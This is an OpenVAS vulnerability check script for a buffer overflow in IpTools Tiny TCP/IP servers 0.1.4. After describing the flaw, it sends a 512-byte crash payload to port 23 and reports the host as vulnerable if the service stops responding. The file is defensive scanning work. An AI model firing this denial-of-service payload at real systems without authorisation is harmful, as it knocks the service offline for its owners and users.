###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_iptools_remote_bof_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# IpTools Tiny TCP/IP Servers Remote Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation may allow remote attackers to execute arbitrary code
  within the context of the application or cause a denial of service condition.
  Impact Level: System/Application";
tag_affected = "IpTools Tiny TCP/IP servers 0.1.4";
tag_insight = "The flaw is due to a boundary error when processing large size
  packets. This can be exploited to cause a heap-based buffer overflow via
  a specially crafted packet sent to port 23.";
tag_solution = "No solution or patch is available as of 09th January, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://iptools.sourceforge.net/iptools.html";
tag_summary = "This host is running IpTools and prone to buffer overflow
  vulnerability.";

if(description)
{
  script_id(802290);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-5345", "CVE-2012-5344");
  script_bugtraq_id(51311, 51312);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-01-09 17:17:17 +0530 (Mon, 09 Jan 2012)");
  script_name("IpTools Tiny TCP/IP Servers Remote Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://sourceforge.net/projects/iptools/");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/521142");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/108430/iptools-overflow.txt");

  script_description(desc);
  script_summary("Check if IpTools is vulnerable to buffer overflow");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(23);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


## Default Port
port = 23;
if(!get_port_state(port)){
  exit(0);
}

## Open TCP Socket
if(!soc = open_sock_tcp(port)){
  exit(0);
}

## Check Banner And Confirm Application
res = recv(socket:soc, length:512);
if("Tiny command server" >!< res)
{
  close(soc);
  exit(0);
}

## Send Exploit
send = send(socket:soc, data:crap(data:"a", length:512));
close(soc);

## Waiting
sleep(3);

## Try to Open Socket
if(!soc1 =  open_sock_tcp(port))
{
  security_warning(port);
  exit(0);
}

## Confirm Server is still alive and responding
if(! res = recv(socket:soc1, length:512)) {
  security_warning(port);
}
close(soc1);
